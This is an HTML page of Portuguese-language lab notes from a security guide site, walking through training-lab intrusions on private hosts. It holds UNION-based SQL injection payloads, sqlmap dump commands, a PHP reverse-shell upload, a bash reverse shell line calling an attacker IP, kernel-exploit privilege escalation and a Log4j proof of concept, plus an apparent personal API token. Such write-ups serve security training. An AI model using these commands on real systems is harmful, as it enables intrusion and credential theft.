@@ -1,0 +1,365 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' https://static.cloudflareinsights.com; style-src 'self'; img-src 'self' data:; connect-src https://cloudflareinsights.com; base-uri 'none'; form-action 'none'">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="Hacking Web - Part01 — nota do Cyber Expert Guide.">
+<title>Hacking Web - Part01 · Teia</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%230a0a0a'/%3E%3Ctext x='16' y='23' font-family='Georgia,serif' font-size='17' font-weight='700' text-anchor='middle' fill='%23cf6a24'%3EJC%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="../styles.css?v=e6e699ca">
+</head>
+<body>
+<header class="site">
+  <a class="wordmark" href="../index.html">CYBER<span>/</span>EXPERT GUIDE</a>
+  <nav aria-label="Seções">
+    <a href="../">Home</a>
+    <a href="../guia.html">Guia</a>
+    <a href="../roadmap.html">Roadmaps</a>
+    <a href="../trilhas.html">Trilhas</a>
+    <a href="../artigos.html" aria-current="page">Artigos</a>
+    <details class="nav-group">
+      <summary>Recursos</summary>
+      <div class="nav-menu">
+        <a href="../canivete.html">Canivete suíço</a>
+        <a href="../solucoes.html">HUB Sec</a>
+        <a href="../checklist.html">Checklist</a>
+        <a href="../plataformas.html">Plataformas</a>
+
+        <a href="../eventos.html">Eventos</a>
+        <a href="../radar.html">Radar</a>
+        <a href="../noticias.html">Notícias</a>
+      </div>
+    </details>
+    <a href="../sugestoes.html">Sugestões</a>
+  </nav>
+</header>
+<main class="wrap">
+  <p class="crumb"><a href="../teia.html">&larr; Teia</a></p>
+  <article class="sec-g prose">
+    <h1>Hacking Web - Part01</h1>
+    
+    <p>Type:<span class="wl-missing">Hacking</span> <a href="cyber.html" class="wl">Cyber</a><br>Skills: <a href="linux.html" class="wl">Linux</a> <br>08/10</p>
+<p>LAB</p>
+<p>Analise do servidor com curl e whatweb</p>
+<p></p>
+<p>Teste….</p>
+<p>No caso abaixo o Whatweb foi rejeitado possivelmente pelo waf do exercito<br><br>Trocando o user-agent a requisição passa…</p>
+<p><br>==============================================</p>
+<p>Nikto -h</p>
+<p><i>Nikto</i>  é uma ferramenta desenvolvida em Perl, cujo objetivo é o de assessoria em servidores WEB, enquadrando-se na categoria de scanners de vulnerabilidades.</p>
+<hr>
+<p>Se provocarmos um erro em uma tela (GET) e gerar erro ou tela em branco é porque é vulnerável a SQL Injection. Exemplo:</p>
+<p>Após inserir ‘ no final da request, a página ficou em branco</p>
+<p></p>
+<p>Outro exemplo de um site na internet:</p>
+<p></p>
+<p>===================================================</p>
+<p>Para explorar SQL Injection</p>
+<p>Precisamos entende ruma estrutura de banco de dados</p>
+<p>Database</p>
+<p>Tabelas</p>
+<p>Colunas</p>
+<p>Linhas</p>
+<p>==================================</p>
+<p>No LAB tentamos fazer uma requisição com ORDER BY 1 e fomos aumentando o número até dar erro, dessa forma entendemos quantas colunas tem a aplicação<br><br>Agora que sabemos que tem 7 colunas, vamos descobrir qual conseguimos explorar<br></p>
+<p>Agora que sabemos quais as colunas podemos explorar, vamos usar a coluna 7 para descobrir a versão do Banco</p>
+<p></p>
+<p>Procurando na internet, podemos encontrar qual é a tecnologia e alguns exploits dessa versão:</p>
+<p></p>
+<p>Descobrimos que é um MySQL</p>
+<hr>
+<p>Tem um site que nos mostra os comandos de vários bancos</p>
+<p>[](https://pentestmonkey.net/c)<a href="https://pentestmonkey.net/" target="_blank" rel="noopener noreferrer">https://pentestmonkey.net/</a></p>
+<p>Conseguimos explorar o etc/passwd</p>
+<p></p>
+<p>=================================</p>
+<ul><li>Database → [](http:// 192.168.10.102/?id=-4%20UNION%20SELECT%201,2,3,4,5,6,DATABASE())<a href="http://192.168.10.102/?id=-4" target="_blank" rel="noopener noreferrer">http://192.168.10.102/?id=-4</a> UNION SELECT 1,2,3,4,5,6,DATABASE()</li></ul>
+<p>→ Retornou: CMS</p>
+<ul><li>Tabelas</li></ul>
+<p>1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=’cms’</p>
+<p>→ Retornou: Posted by: event,log,user</p>
+<ul><li>Tabela escolhida: Colunas</li></ul>
+<p>1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=’user’ and table_schema=’cms’</p>
+<p>→ Retornou: Posted by: user_id,user_username,user_password</p>
+<ul><li>Tuplas(Linhas)</li></ul>
+<p>1,2,3,4,5,6,group_concat(user_id, user_username, user_password) from user</p>
+<p>→ Retornou: Posted by: 1admin25e4ee4e9229397b6b17776bfceaf8e7</p>
+<p></p>
+<p>Percebemos que é um HASH e vamos ver no google se alguém já quebrou esse hash</p>
+<p></p>
+<p>Vamos logar na página após descobrir as credencias...<br>E vamos ‘pichar’ o site:</p>
+<p></p>
+<p>================================</p>
+<p>Colocar um reverse shell no servidor<br><br>Editando o arquivo para o IP da nossa máquina</p>
+<p></p>
+<p>Vamos instalar o rlwrap para melhorar o netcat</p>
+<p><br>Vamos escutar na porta 4321 que colocamos no .php</p>
+<p>Depois injetamos no site nosso reverse shell fazendo upload pela interface gráfica do site, vamos para a home e agora nosso shell reverso fechou conexão e então exploramos o servidor.</p>
+<p><br>Capturamos a flag</p>
+<p>2db5217ba15177ab73c6618d34527b1b</p>
+<p>FIM LAB 102</p>
+<p>====================================================</p>
+<p>LAB 109</p>
+<p>Vamos tentar uma ferramenta automatizada (sqlmap) para explorar esse GET</p>
+<p>sqlmap -u <a href="http://192.168.10.109/Consulta/consulta_lista_secao.php?codigo_codom=004119" target="_blank" rel="noopener noreferrer">http://192.168.10.109/Consulta/consulta_lista_secao.php?codigo_codom=004119</a> --current-db --batch</p>
+<p>o BATCH é para não fazer pergunta…</p>
+<p>Resultado:</p>
+<p>Descobrimos que a database chama TELEFONE e tem vulnerabilidade</p>
+<p>Agora que temos a database, vamos para a tabela</p>
+<p>Pegando a coluna ‘senha ‘</p>
+<p>sqlmap -u <a href="http://192.168.10.109/Consulta/consulta_lista_secao.php?codigo_codom=004119" target="_blank" rel="noopener noreferrer">http://192.168.10.109/Consulta/consulta_lista_secao.php?codigo_codom=004119</a> -D telefone -T senha --columns --batch</p>
+<p>sqlmap -u <a href="http://192.168.10.109/Consulta/consulta_lista_secao.php?codigo_codom=015255" target="_blank" rel="noopener noreferrer">http://192.168.10.109/Consulta/consulta_lista_secao.php?codigo_codom=015255</a> -D telefone -T senha -C usuario_geral,senha_geral --dump --batch</p>
+<p>Agora descobrimos um hash</p>
+<p>Vamos jogar no google e quebrar essa senha</p>
+<p>—Descobrimos que a senha é Entrar123</p>
+<p>======================</p>
+<p>Temos o usuário geral e senha</p>
+<p>Mas não encontramos nenhum lugar para entrar pela aplicação, vamos rodar um NMAP e ver o que encontramos</p>
+<p>nmap -sV 192.168.10.109</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f0e19522-0097-4061-8e07-1b336551ef91/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>mas não fechou o SSH, vamos tentar abaixar o nível da criptografia com esse comando</p>
+<p>ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss [telefonista@192.168.10.109](mailto:telefonista@192.168.10.109)</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9b5f9896-8a6d-4088-b439-895538972cd3/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<hr>
+<p>=== Escalação de privilégio</p>
+<p>Podemos pelo Kernel ou tentar um sudo su ou outras…</p>
+<p>o Comando <b>sudo -l</b> nos descobrimos se temos a permissão de SUDO</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4453956e-a1ec-4389-9676-f6e33a8397c6/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Então agora vamos subir o privilégio</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3e540672-bd15-4e5f-86c7-9888b442d20d/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Pegando a flag no root</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f0ce7646-2cfc-44b9-af65-f9a699c9febe/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>e884871850a5ed525a8dd6add09e48b2</p>
+<p>===================================</p>
+<p>NOVO LAB</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d1407dca-2858-4eb3-9bbc-58c79d208fa0/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Rodando um nmap, descobrimos que tem a porta 80 aberta, rodando um Apache</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1222f902-7422-445e-be54-083caee8937d/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Com o comando whatweb, descobrimos qual o possível servidor</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/33abd177-05b6-4c14-8e4f-ad1004ed5ea5/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Com comando nikto</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4bec3329-26e3-4042-a2f2-30904bac4119/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Se é wordpress podemos usar o wpscan, pegarmos uma API Token (particular e intransferível)</p>
+<p>qO0hKruwnu7AarlL6pNFBCYmJfHNraLzhxUm77J1N8o</p>
+<p>E vamos rodar um comando na nossa máquina para scannear esse wordpress</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a3bcb75b-ae28-4413-9656-d40b65fe3a25/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Resultado:</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9190bfff-14e6-4b4f-8371-93245ab1ca3d/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos usar o comando searchsploit para descobrir os exploits dessa versão do wordpress</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/23704bbb-5343-47b8-bf3e-ace04695ee95/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Baixando o exploit (-m = mirror)</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f67b605d-46ae-4afd-9911-476147bfe292/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Rodando o exploit para ver as instruções</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9d43618d-b7f7-4604-8f7b-e24e48cfec4a/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c76425cd-a659-4951-84de-ccbb32082356/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Deu erro, então vamos abrir o arquivo para ver a linha 24….</p>
+<p>O erro aconteceu por causa disso:</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4f205212-da9f-4a2d-99b8-61643655f324/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Mas como já vimos que é esse parâmetro que é vulnerável, vamos fazer sem esse exploit.</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/71c0ce68-3155-4a90-bbb8-1fc38ad6229e/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Descobrimos que é wordpress</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/835b36f7-caa5-4ae9-b317-75819ed9f58c/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos na tabela que queremos..</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/440fdc57-6681-499f-a51b-e1bf6c39195c/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Agora vamos pegar as colunas</p>
+<p>sqlmap -u <a href="http://192.168.10.117/Hackademic_RTB1/?cat=1" target="_blank" rel="noopener noreferrer">http://192.168.10.117/Hackademic_RTB1/?cat=1</a> -D wordpress -T wp_users --columns --batch</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/026915e3-afd4-4ac6-a71d-ef4dfe11dcf4/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Agora vamos ver esses resultados …</p>
+<p>sqlmap -u <a href="http://192.168.10.117/Hackademic_RTB1/?cat=1" target="_blank" rel="noopener noreferrer">http://192.168.10.117/Hackademic_RTB1/?cat=1</a> -D wordpress -T wp_users -C user_login,user_pass,user_level --dump --batch</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d4b692c6-9f66-46b5-80de-5a83db7cc658/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>O nível 10 é o administrador, GeorgeMiller</p>
+<p>Vamos acessar o wp-login</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/79e3c565-09ee-4332-a5fb-42a63be71216/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos adicionar para permitir upload de arquivo e adicionar a extensão PHP</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e1996932-bfc9-4681-9572-3da3f9dd7312/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos fazer um upload no nosso Shell reverso</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/461cd33d-1985-4672-9868-d71abfa93c1b/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Acesso com sucesso…</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6d94300c-4028-4ba8-ba77-e5f909088332/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos ver o Kernel e está desatualizado… Qual exploit podemos usar para virar root?</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7f0b6b88-cc5d-4be7-ac68-7a1a542e722f/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p><b>Vamos usar o Linux Exploit Suggester 2, passando o Kernel para ele, ele nos dará exploits para utilizar….</b></p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/28c8353e-1f50-4b23-b1fe-2d653e619172/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos usar o comando</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3469436a-2de5-4047-b160-f51d4749f807/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Encontramos 72 possíveis exploits</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b0bb8d01-e19c-403b-8294-7f33133ce3a8/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Tem um exploit RDS que aparece como posível exploit</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/01cfbea7-dad3-4ef3-b886-64300818d7a7/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos validar se tem GCC an máquina que invadimos…</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/50c1e672-051c-4745-9543-ab789b5d6d04/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Copiamos para a nossa máquina o exploit</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f79199c1-93f2-4df8-8dec-f95a2087539c/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos levar esse arquivo para a máquina invadida</p>
+<p>Trocamos as portas de envio e recebimento</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/80ee242f-7501-44c1-933a-8be09e837f20/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos para o tmp porque lá podemos tudo.. apagar, executar, editar …</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a6decc74-74fa-449f-a93b-437111249b4e/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Abrimos a porta 80 na nossa máquina e dentro da máquina invadida vamos baixar nosso arquivo…</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8a66e5d7-1518-4af1-bbf6-02d5dcfa81ea/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Agora que o arquivo está na máquina invadida, vamos usar o gcc para compilar o arquivo C</p>
+<p>gcc 15285julio.c -o julio</p>
+<p>Depois vamos rodar</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e9dc728f-4532-4ea6-a549-9240e55eadf0/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Agora rodamos o ’id’ para ver se conseguimos e vamos pegar a flag</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/da92463f-0bf7-425d-ace1-7ed078932ae2/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f160b2c3-2aa5-4800-a316-1abc47736622/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>==================================================</p>
+<p>Novo LAB</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a8e49562-83fd-4ba5-9bb1-56ca78a2da02/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Validando se é vulnerável a SQL Injection, o — - comenta o resto e não precisamos colocar a senha..</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5da74a3a-8006-43cd-932c-962ee11a1ca9/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Entramos…</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/483a8907-a5be-402f-93c4-ad0df9418930/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos analisar no Burp essa requisição</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/45df44df-916c-4192-9f3d-2569baf00f35/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Capturar esse post, vamos colocar em um arquivo e tentar explorar com sqlmap</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e80c4a9b-8834-42b6-b785-062e54b9fe04/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>vamos usar o comando</p>
+<p>sqlmap -u &lt;host&gt; sistalento -tables —batch</p>
+<p>Resultado:</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/67839aba-fd01-491e-856c-15395e51ef7a/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Agora vamos fazer um dump</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e78786d3-2c61-4c80-9c4e-6968603a548e/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Resultado:</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3f301696-b719-4e19-b19f-23d62737c514/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Com o sqlmap, vamos tentar puxar o etc/passwd</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/95b99792-58e1-47e9-88ac-fcd16340085b/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>O arquivo foi para um diretório, em outro terminal acessamos o passwd e vimos que o mesmo usuário da aplicação tem acesso no Servidor…</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/24a054da-14f5-44aa-8091-c9c6b0dbe6a0/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos acessar a máquina com SSH</p>
+<p>ssh -o KexAlgorithms=diffie-hellman-group14-sha1 -oHostKeyAlgorithms=+ssh-dss [zeus@192.168.10.117](mailto:zeus@192.168.10.117)</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e61e502f-e28f-489d-ba61-9b3f389f94dd/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Na nossa máquina, vamos procurar um exploit para essa versão.</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/e06dabc2-ab13-4c91-9fe9-f62bf410b58d/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/df59ae32-c5b1-4ee4-8b7a-545dc6da4834/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos abrir a porta 80, baixar o arquivo, converter com GCC e com a escalação de privilégio feita, vamos colher a flag.</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/3e1480be-35a0-4255-86e9-29512e9bfc11/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Validando a flag</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ccaef68a-3cbd-400b-bf68-20f671708945/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>===============================================================</p>
+<p>Acessando o mesmo LAB e criando duas listas para explorar um bruteforce</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/024eabe5-b042-4657-bb8e-fe0d0eb066bb/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9d4f5d92-2f82-4d84-b04c-2fa90539ec92/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>=================================================</p>
+<p>Novo LAB</p>
+<p>Acessando um novo lab que tem uma console e interceptando pelo Burp…</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6c8bb1e9-8e89-4502-a24f-d64194a78eb6/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/4a03b6fe-fd6f-441f-80b1-ba78d7997d3c/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Como nosso IP não é permitido, vamos usar o x-forwarded-for: 192.168.10.165 no header</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c7b6180e-ddbf-4b7f-b24f-0a7b0bbbac3c/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Como tem NC habilitado, vamos usar a possibilidade e conseguimos….</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b4f7eb27-f1a1-4df0-9033-8bf17adbe6ca/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Mas vamos supor que não tinha essa possibilidade, vamos criar ums script</p>
+<p>Script .sh que contém esse contéudo</p>
+<p>/bin/bash -c &quot;/bin/bash -i &gt; /dev/tcp/192.168.100.5/4321 0&gt;&amp;1 2&gt;&amp;1”</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/97aad23a-1548-4e72-8f72-6fa86cf7484c/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos ver se o arquivo foi</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d822bda3-6a69-4222-bfd8-c01c5e3b9e21/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>chmod 777 /tmp/julio.sh</p>
+<p>ls -l /tmp/eder.sh</p>
+<p>Agora vamos executar….</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1c0fc116-0631-4cdb-b203-112b4bb8963d/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>… Executamos e percebemos que é 32 bits, então vamos ter que compilar em 32 bits</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/f427e42e-344b-42ff-807c-fdb6e5c92733/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos compilar em 32 bits o nosso shell reverso - comando -m32</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dbf83715-4777-4b57-8bde-140b6814f9d8/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Agora vamos subir um python e fazer um wget para puxar o arquivo</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d25be3a0-dd9e-4e68-8a57-28d1ffec8743/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Tentamos executar agora, mas o servidor não deixou porque não tem o GCC…</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5750bf0e-040d-4cce-8aae-a17962a04c24/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Conseguimos escalar privilégio compilando o arquivo em uma máquina com a mesma configuração e versão do Kernel da máquina invadida.</p>
+<p>E dessa forma tivemos a flag do Lab.</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/5a25c7d8-df43-470c-855d-197fcb4085de/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>===========================================================</p>
+<h2>LOG4J</h2>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/752394d6-0581-4eba-8c6e-fa80c39bde0c/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/687057c9-e418-4590-b409-92615d605e17/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Começando o LAB….</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/836f35ec-0cf5-4d17-a6b8-1fff0cd97da5/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Descobrimos que a porta 8080 pode ser vulnerável a log4j, então jogamos isso para dentro do Burp para explorar possibilidades no Header do site… E observe que no parâmetro X-api-version tem a vulnerabilidade. E nosso Apache na porta 80 que está escutando, gerou log…</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bf13d197-5348-49ad-bfed-963f2d42d51d/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos procurar exploit para essa vulnerabilidade</p>
+<p><a href="https://github.com/kozmer/log4j-shell-poc" target="_blank" rel="noopener noreferrer">https://github.com/kozmer/log4j-shell-poc</a></p>
+<p>O exploit precisa do JDK</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/baf6368a-5661-4efa-aae6-1f1cb2c9d4f4/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Baixamos o JDK e descompactamos…</p>
+<p>wget <a href="https://repo.huaweicloud.com/java/jdk/8u201-b09/jdk-8u201-linux-x64.tar.gz" target="_blank" rel="noopener noreferrer">https://repo.huaweicloud.com/java/jdk/8u201-b09/jdk-8u201-linux-x64.tar.gz</a></p>
+<p>tar -xzvf jdk-8u201-linux-x64.tar.gz</p>
+<p>Instalamos os requisitos da POC</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/229ac7f9-5533-4e7d-a82a-eae5856f8a4c/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Executamos…</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c9fb9b4c-4af7-4df7-96be-b87f1e201055/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Não conseguimos ver nada e quando formos ver o IP, é outro.. estamos em um container</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b26bcecd-6361-41a7-b4fb-7ab295ec3186/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Vamos baixar o linpeas (uma ferramenta que levanta várias informações do UNIX)</p>
+<p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS" target="_blank" rel="noopener noreferrer">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a></p>
+<p>wget <a href="https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" target="_blank" rel="noopener noreferrer">https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</a></p>
+<p>Vamos jogar para a máquina invadida o linpeas…</p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/dbd87de8-4694-4d61-b190-fa6182706cc4/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>!<a href="https://s3-us-west-2.amazonaws.com/secure.notion-static.com/75021e41-12cb-482d-a8bf-dfd372116f96/Untitled.png" target="_blank" rel="noopener noreferrer">Untitled</a></p>
+<p>Resultado</p>
